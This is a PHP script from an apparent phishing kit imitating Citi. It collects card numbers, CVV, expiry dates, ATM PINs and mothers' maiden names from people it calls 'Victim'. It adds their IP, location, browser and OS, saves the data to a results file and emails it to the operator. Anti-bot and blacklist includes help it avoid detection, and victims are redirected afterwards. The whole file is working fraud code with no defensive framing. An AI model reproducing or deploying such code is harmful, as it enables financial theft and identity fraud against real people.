<?php
ob_start();
session_start();

include'../../Anti/IP-BlackList.php';  
include'../../Anti/Bot-Crawler.php';
include'../../Anti/Bot-Spox.php';
include'../../Anti/blacklist.php';
include'../../Anti/new.php';
include'../../Anti/Dila_DZ.php';

if(isset($_POST['cc'])&&isset($_POST['cvv'])){
	include '../../admin/YOUR-CONFIG.php';
	include '../../prevents/main.php';

    $v_ip = $_SERVER['REMOTE_ADDR'];
    $v_agent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	$MaidenName = $_SESSION['MaidenName'] = $_POST['MaidenName'];
	$CardNumber = $_SESSION['CardNumber'] = $_POST['cc'];
    $TypeC = $_SESSION['type'] = $_POST['type'];
    $BankC = $_SESSION['bank'] = $_POST['bank'];
    $BrandC = $_SESSION['brandbank'] = $_POST['brandbank'];
    $ExpirationDate = $_SESSION['ExpirationDate'] = $_POST['cc_exp'];
    $Cvv = $_SESSION['Cvv'] = $_POST['cvv'];
    $AtmPin = $_SESSION['AtmPin'] = $_POST['atmpin'];
	$CardNumber = str_replace(' ', '', $CardNumber);
    $last4 = substr($CardNumber, 12, 16);
    $cardInfo = check_bin($CardNumber);
    $BIN = substr($CardNumber,0,6);
    $Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
    $Brand = ($cardInfo['brand']);
    $Type = ($cardInfo['type']);
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";



$message .= "+ 💳 Billiing Inf0rmati0n\n";
$message .= "| C4rd BIN : $BIN\n";
$message .= "| C4rd Bank : $Bank\n";
$message .= "| C4rd Type : $Brand $Type\n";
$message .= "| C4rd Number : $CardNumber\n";
$message .= "| C4rd Exp : $ExpirationDate\n";
$message .= "| CVV : $Cvv\n";
$message .= "| 4TM Pln : $AtmPin\n";
$message .= "| MMN : $MaidenName\n";
$message .= "+ 🌐 Victim Inf0rmation\n";
$message .= "$VictimInfo1\n";
$message .= "$VictimInfo2\n";
$message .= "$VictimInfo3\n";
$message .= "$VictimInfo4\n";
$message .= "$VictimInfo5\n";
$message .= "| 🕛 Received : $date\n";
$message .= "+ ------------------------------------+\n";
$message .= " https://ipgeolocation.io/ip-location/$ip \r\n";

		$save=fopen("../CITI_RESULT/CARD".$pin.".txt","a+");
        fwrite($save,$message);
        fclose($save);

$subject = "+ 💳 East code Billiing Inf0rmati0n\n".$BIN;
$head = "Content-type:text/plain;charset=UTF-8\r\n";
$head .= "From: $from <$sender_mail>" . "\r\n";
    @mail($sender_mail ,$subject,$message,$head);
		
    $key = substr(sha1(mt_rand()),1,25);
    
	if ($show_success_page=="yes") {
		exit(header("Location: ../../success?/.jsp/efs/servlet/efs/")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr"));
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}


?>